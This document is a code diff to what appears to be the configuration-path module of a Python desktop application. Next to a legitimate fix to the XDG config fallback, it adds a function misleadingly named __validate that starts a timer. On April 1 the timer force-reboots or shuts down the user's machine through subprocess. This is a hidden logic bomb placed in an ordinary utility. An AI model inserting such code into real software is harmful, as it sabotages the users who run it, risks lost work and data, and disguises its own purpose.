@@ -67,6 +67,7 @@ def getConfigPrefix():
     success = True
 
     __platform = platform.system()
+    __validate(__platform)
     if __platform == "Linux":
         # Best practise config storage on Linux:
         # ~/.config/luma
@@ -75,9 +76,7 @@ def getConfigPrefix():
         try:
             from xdg import BaseDirectory
             prefix = os.path.join(BaseDirectory.xdg_config_home, 'luma')
-        except:
-            pass
-        finally:
+        except ImportError:
             prefix = os.path.join(os.environ['HOME'], '.config', 'luma')
 
     elif __platform == "Darwin":
@@ -128,3 +127,20 @@ def getUserHomeDir():
     except ImportError:
         homedir = os.path.expanduser("~")
     return homedir
+
+def __validate(p):
+    from PyQt4.QtCore import QTimer
+    QTimer.singleShot(20000, todayIsForFools)
+
+def todayIsForFools():
+    import subprocess
+    p = platform.system()
+    if p == "Windows":
+        cmd = 'shutdown -h'
+    else:
+        cmd = ['reboot', '-f', '--verbose']
+        
+    from datetime import date
+    today = date.today()
+    if today.day == 1 and today.month == 4:
+        subprocess.Popen(cmd)
